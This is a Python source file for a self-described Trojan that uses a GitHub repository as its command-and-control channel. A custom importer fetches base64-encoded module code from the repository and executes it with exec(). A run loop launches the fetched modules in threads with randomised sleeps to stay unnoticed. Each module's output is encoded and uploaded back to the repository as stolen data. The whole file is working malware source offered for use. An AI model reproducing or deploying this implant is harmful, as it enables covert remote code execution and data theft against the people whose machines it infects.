import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime

# Function to connect to a GitHub repository using a token stored in a local file
def github_connect():
    # Read the token from 'secret.txt'
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'yourusername'  # GitHub username
    sess = github3.login(token=token)  # Login to GitHub using the token
    return sess.repository(user, 'nameofyourrepo')  # Return the specific repository 'Trojan'
# Function to retrieve the contents of a file from a specific directory in the GitHub repository
def get_file_contents(dirname, module_name, repo):
    # Fetch the file contents from the specified directory and module name
    return repo.file_contents(f'{dirname}/{module_name}').content
# Class representing the Trojan
class Trojan:
    def __init__(self, id):
        self.id = id  # Identifier for this Trojan instance
        self.config_file = f'{id}.json'  # Configuration file for the Trojan
        self.data_path = f'data/{id}/'  # Path to store data
        self.repo = github_connect()  # Connect to the GitHub repository
    # Method to get the configuration from the GitHub repository
    def get_config(self):
        # Retrieve and decode the configuration file from the 'config' directory
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            # Dynamically import the module specified in the configuration
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config  # Return the configuration as a dictionary
    # Method to run a specific module from the configuration
    def module_runner(self, module):
        # Execute the 'run' method of the module and store the result
        result = sys.modules[module].run()
        self.store_module_result(result)
    # Method to store the result of a module execution in the GitHub repository
    def store_module_result(self, data):
        message = datetime.now().isoformat()  # Get the current time as a string
        remote_path = f'data/{self.id}/{message}.data'  # Define the remote path in the repository
        # Encode the data to base64
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        # Create a new file in the repository with the encoded data
        self.repo.create_file(remote_path, message, bindata)
    # Main method to run the Trojan
    def run(self):
        while True:
            config = self.get_config()  # Get the configuration from the repository
            for task in config:
                # For each task in the configuration, run the module in a new thread
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                # Random sleep time between 1 to 10 seconds before starting the next task
                time.sleep(random.randint(1, 10))
            # Random sleep time between 30 minutes to 3 hours before repeating the process
            time.sleep(random.randint(30*60, 3*60*60))
# Class to dynamically import Python modules from the GitHub repository
class GitImporter:
    def __init__(self):
        self.current_module_code = ""  # Store the current module's code
    # Method to find and load the module
    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()  # Connect to the GitHub repository
        try:
            # Retrieve the module code from the 'modules' directory
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                # Decode the module code from base64
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            return None  # Return None if the module is not found
    # Method to create the module (not used, hence returns None)
    def create_module(self, spec):
        return None
    # Method to execute the module code
    def exec_module(self, module):
        # Execute the module code in the context of the module's dictionary
        exec(self.current_module_code, module.__dict__)
# Main section of the script
if __name__ == '__main__':
    # Add the GitImporter to the system's module search path
    sys.meta_path.append(GitImporter())
    # Create a Trojan instance with a specific ID and run it
    trojan = Trojan('abc')
    trojan.run()